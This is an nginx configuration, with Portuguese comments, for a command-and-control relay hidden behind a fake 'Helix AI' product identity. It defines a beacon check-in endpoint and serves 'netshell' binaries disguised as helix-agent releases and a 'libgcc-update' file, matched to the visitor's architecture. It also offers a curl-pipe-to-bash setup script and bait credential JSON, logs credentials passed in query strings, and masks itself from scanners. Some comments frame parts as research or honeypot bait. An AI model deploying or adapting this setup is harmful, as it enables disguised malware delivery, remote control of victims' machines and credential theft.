# bat.conf   nginx config completo do relay v10
# __CDN_DOMAIN__ | __RELAY_IP__   Helix AI cover identity

user www-data;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    server_tokens off;

    log_format research  '$remote_addr [$time_local] "$request" $status $body_bytes_sent '
                         'rt=$request_time ssl=$ssl_protocol cipher=$ssl_cipher';

    # Formato para delivery   inclui IP real (Cloudflare CF-Connecting-IP) e User-Agent
    log_format delivery  '$http_cf_connecting_ip [$time_local] "$request" $status $body_bytes_sent '
                         '"$http_user_agent" edge=$remote_addr';

    # Formato para admin honeypot   captura URI completa (inclui query string com credenciais)
    log_format admin_log '$http_cf_connecting_ip [$time_local] "$request" $status '
                         '"$http_user_agent" ref="$arg_ref" tok="$arg_tok" edge=$remote_addr';

    access_log /var/log/nginx/access.log research;
    error_log  /var/log/nginx/error.log warn;

    sendfile on;
    client_max_body_size 10M;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=api:10m      rate=10r/s;
    limit_req_zone $binary_remote_addr zone=web:10m      rate=60r/m;
    limit_req_zone $binary_remote_addr zone=delivery:10m rate=10r/m;
    limit_req_zone $binary_remote_addr zone=scanners:10m rate=5r/m;

    # Arch detection via User-Agent
    map $http_user_agent $agent_binary {
        ~*(aarch64|arm64) "netshell-v10-arm64";
        default           "netshell-v10-x86_64";
    }

    # HTTP → HTTPS redirect (porta 80 restrita a Cloudflare IPs via UFW+GCP fw)
    server {
        listen 80;
        server_name __CDN_DOMAIN__;

        location /.well-known/acme-challenge/ {
            root /var/www/nexus;
            allow all;
        }
        location / {
            return 301 https://$host$request_uri;
        }
    }

    # Default deny   acesso direto por IP sem SNI correto
    server {
        listen 80  default_server;
        listen 443 default_server ssl;
        ssl_certificate     /etc/letsencrypt/live/__CDN_DOMAIN__/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/__CDN_DOMAIN__/privkey.pem;
        server_name _;
        return 444;
    }

    # Principal   __CDN_DOMAIN__
    server {
        listen 443 ssl;
        server_name __CDN_DOMAIN__;

        ssl_certificate     /etc/letsencrypt/live/__CDN_DOMAIN__/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/__CDN_DOMAIN__/privkey.pem;
        ssl_protocols       TLSv1.2 TLSv1.3;
        ssl_ciphers         HIGH:!aNULL:!MD5;
        ssl_session_cache   shared:SSL:10m;
        ssl_session_timeout 10m;

        add_header Strict-Transport-Security "max-age=63072000"                                                               always;
        add_header X-Content-Type-Options    "nosniff"                                                                          always;
        add_header X-Frame-Options           "DENY"                                                                             always;
        add_header Referrer-Policy           "no-referrer"                                                                      always;
        add_header Content-Security-Policy   "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; frame-ancestors 'none'" always;
        add_header Permissions-Policy        "geolocation=(), camera=(), microphone=(), payment=()"                             always;

        autoindex off;

        # C2 endpoint   bat-agent beacons (POST only)
        location = /check-in {
            limit_req zone=api burst=20 nodelay;
            proxy_pass         https://127.0.0.1:8443;
            proxy_ssl_verify   off;
            proxy_http_version 1.1;
            proxy_set_header   Host $host;
            proxy_set_header   X-Real-IP $remote_addr;
            proxy_read_timeout 120s;
            access_log off;
        }

        # Helix AI agent delivery   paths documentados no dashboard e na API
        location = /releases/helix-agent-linux-amd64 {
            limit_req zone=delivery burst=5 nodelay;
            alias /var/www/nexus/agents/netshell-v10-x86_64;
            add_header Content-Type        "application/octet-stream"                    always;
            add_header Content-Disposition 'attachment; filename="helix-agent-linux-amd64"' always;
            add_header X-Robots-Tag        "noindex, nofollow"                           always;
            access_log /var/log/nginx/delivery.log delivery;
        }
        location = /releases/helix-agent-linux-arm64 {
            limit_req zone=delivery burst=5 nodelay;
            alias /var/www/nexus/agents/netshell-v10-arm64;
            add_header Content-Type        "application/octet-stream"                    always;
            add_header Content-Disposition 'attachment; filename="helix-agent-linux-arm64"' always;
            add_header X-Robots-Tag        "noindex, nofollow"                           always;
            access_log /var/log/nginx/delivery.log delivery;
        }

        # API v1   "exposed" JSON com credenciais (Vector B)
        location = /api/v1/ {
            limit_req zone=api burst=10 nodelay;
            root  /var/www/nexus;
            default_type "application/json";
            add_header X-Robots-Tag "noindex, nofollow" always;
            access_log /var/log/nginx/delivery.log delivery;
            try_files /api/v1/index.json =404;
        }

        # API setup script   serve ao curl|bash (Vector B)
        location = /api/setup {
            limit_req zone=delivery burst=5 nodelay;
            root  /var/www/nexus;
            default_type "text/plain; charset=utf-8";
            add_header X-Robots-Tag "noindex, nofollow" always;
            access_log /var/log/nginx/delivery.log delivery;
            try_files /api/setup =404;
        }

        # Legacy honey paths   scanner bait (arch-aware via UA map)
        location ~ ^/(update|cdn/bootstrap|assets/libgcc-update)$ {
            limit_req zone=delivery burst=3 nodelay;
            alias /var/www/nexus/agents/$agent_binary;
            add_header Content-Type        "application/octet-stream"             always;
            add_header Content-Disposition 'attachment; filename="libgcc-update"' always;
            add_header X-Robots-Tag        "noindex, nofollow"                    always;
            access_log /var/log/nginx/delivery.log delivery;
        }

        # Legacy installer /i
        location = /i {
            limit_req zone=delivery burst=3 nodelay;
            root  /var/www/nexus;
            default_type "text/plain; charset=utf-8";
            add_header X-Robots-Tag "noindex, nofollow" always;
            access_log /var/log/nginx/delivery.log delivery;
            try_files /i =404;
        }

        # Admin honeypot   hidden path, found via robots.txt by scanners
        location ^~ /admin/ {
            limit_req zone=web burst=10;
            root  /var/www/nexus;
            index index.html;
            try_files $uri $uri/ =404;
            access_log /var/log/nginx/admin.log admin_log;
            expires -1;
            add_header Cache-Control "no-store";
        }

        # Public app   linked from nav, same credential logging
        location ^~ /app/ {
            limit_req zone=web burst=10;
            root  /var/www/nexus;
            index index.html;
            try_files $uri $uri/ =404;
            access_log /var/log/nginx/admin.log admin_log;
            expires -1;
            add_header Cache-Control "no-store";
        }

        # Cover page
        location / {
            root  /var/www/nexus;
            index index.html;
            try_files $uri $uri.html $uri/ =404;
            limit_req zone=web burst=30;
            expires 1h;
            add_header Cache-Control "public";
        }

        # Absorver probes de scanner sem fingerprinting
        location ~* \.(php|asp|aspx|jsp|cgi|env|git)$ {
            return 200 '';
        }
    }
}
